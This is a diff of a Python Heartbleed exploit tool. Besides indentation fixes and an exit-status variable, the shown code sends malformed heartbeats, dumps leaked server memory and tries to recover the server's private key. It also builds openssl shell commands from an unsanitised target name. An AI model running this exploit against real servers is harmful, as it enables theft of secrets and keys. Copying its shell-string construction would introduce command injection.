@@ -139,7 +139,7 @@ def hexdump(s):
         else:
             pdat += ''.join((c if ((32 <= ord(c) <= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin)
     if opts.hexdump:
-	    return hexd
+      return hexd
     else:
         pdat = re.sub(r'([.]{50,})', '', pdat)
         if opts.asciioutfile:
@@ -160,13 +160,14 @@ def rcv_tls_record(s):
             print 'Unexpected EOF (message)'
             return None,None,None
         if opts.verbose:
-	        print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)
+          print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)
         return typ,ver,message
     except Exception as e:
         print "\nError Receiving Record! " + str(e)
         return None,None,None
 
 def hit_hb(s, targ, firstrun, supported):
+    global status
     s.send(hex2bin(build_heartbeat(supported)))
     while True:
         typ, ver, pay = rcv_tls_record(s)
@@ -178,16 +179,18 @@ def hit_hb(s, targ, firstrun, supported):
             if opts.verbose:
                 print 'Received heartbeat response...'
             if len(pay) > 3:
+                status = 17
                 if firstrun or opts.verbose:
                     print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'
                 if opts.rawoutfile:
                     rawfileOUT.write(pay)
                 if opts.extractkey:
-                	return pay
+                  return pay
                 else:
-	                return hexdump(pay)
+                  return hexdump(pay)
             else:
                 print 'Server processed malformed heartbeat, but did not return any extra data.'
+                status = 17
 
         if typ == 21:
             print 'Received alert:'
@@ -224,7 +227,7 @@ def bleed(targ, port):
                 if not os.path.exists('./hb-certs'):
                     os.makedirs('./hb-certs')
                 print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'
-                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')	
+                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')  
                 print '\nExtracting modulus from cert...\n'
                 os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem > hb-certs/sslcert_' + targ + '_pubkey.pem')
                 output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')
@@ -362,12 +365,12 @@ def bleed(targ, port):
             
             keyfound = False
             if opts.extractkey:
-            	res = hit_hb(s, targ, firstrun, supported)
-            	if res == '':
-            	    continue
-            	keyfound = extractkey(targ, res, modulus)
+              res = hit_hb(s, targ, firstrun, supported)
+              if res == '':
+                  continue
+              keyfound = extractkey(targ, res, modulus)
             else:
-	            res += hit_hb(s, targ, firstrun, supported)
+              res += hit_hb(s, targ, firstrun, supported)
             s.close()
             if keyfound:
                 sys.exit(0)
@@ -385,7 +388,7 @@ def bleed(targ, port):
        print               
 
 def extractkey(host, chunk, modulus):
-	
+  
     #print "\nChecking for private key...\n"
     n = int (modulus, 16)
     keysize = n.bit_length() / 16
@@ -449,6 +452,9 @@ def main():
     
     if opts.asciioutfile:
         asciifileOUT.close()
+
+status = 0
             
 if __name__ == '__main__':
     main()
+    exit(status)
